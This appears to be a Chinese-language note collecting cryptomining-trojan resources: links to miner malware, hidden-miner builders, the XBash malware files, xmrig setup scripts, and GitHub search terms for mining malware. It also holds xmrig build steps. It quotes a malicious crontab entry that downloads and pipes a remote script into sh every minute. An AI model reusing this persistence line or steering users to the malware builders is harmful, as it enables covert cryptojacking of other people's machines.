3. 挖矿木马手机脚本: https://github.com/MinervaLabsResearch/BlogPosts/blob/master/MinerKiller/MinerKiller.sh
4. 简易挖矿木马脚本： https://www.jianshu.com/p/30ca626c9e3a
5. xrmig一键脚本： https://github.com/seanwhe/xmrig-bash-scripts , https://github.com/thequietman44/xmrig-scripts/


发现木马反复执行一个定时任务`crontab -e`：
```
# -q 静默模式， -O - 代表输出到对应的文件 /dev/null中，这个文件是一个空包
* * * * * wget -q -O - http://195.3.146.118/sc.sh | sh > /dev/null 2>&1
```
wget下载脚本，然后运行脚本自动删除脚本: `wget http://sitehere.com/install.sh -O - | sh`


### 木马脚本

Windows平台木马： https://github.com/NYAN-x-CAT/Lime-Miner

Windows强力病毒： https://github.com/hawksh/Hidden-miner-builder

Windows挖矿提高脚本: https://github.com/DeadManWalkingTO/Windows10MiningTweaksDmW


### Github搜索病毒

关键字: xmr mining shell, mining malware,Xmrig Miner Malware



### 病毒脚本

1. 脚本参考： https://github.com/MoneroOcean/xmrig_setup
2. 脚本搜索目录： https://github.com/search?l=Shell&p=2&q=.%2Fxmrig&type=Code
3. 病毒清理脚本： https://github.com/MoreSecLab/DDG_MalWare_Clean_Tool/blob/master/clear.sh
4. xbash病毒脚本: https://www.freebuf.com/articles/terminal/185106.html, https://github.com/h3ct0rjs/XBash-malware-files

```shell
# 以下是安装脚本，可以先编译好不用执行如下脚本
# 下载
sudo apt install -y software-properties-common git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev libhwloc-dev gcc g++ 
git clone https://github.com/xmrig/xmrig.git
# 设置抽水比率
cd xmrig
sed -i 's/kDefaultDonateLevel =.*/kDefaultDonateLevel = 0;/' src/donate.h
sed -i 's/kMinimumDonateLevel =.*/kMinimumDonateLevel = 0;/' src/donate.h
# 创建编译目录
mkdir build && cd build
cmake ..
make -j$(nproc)




````

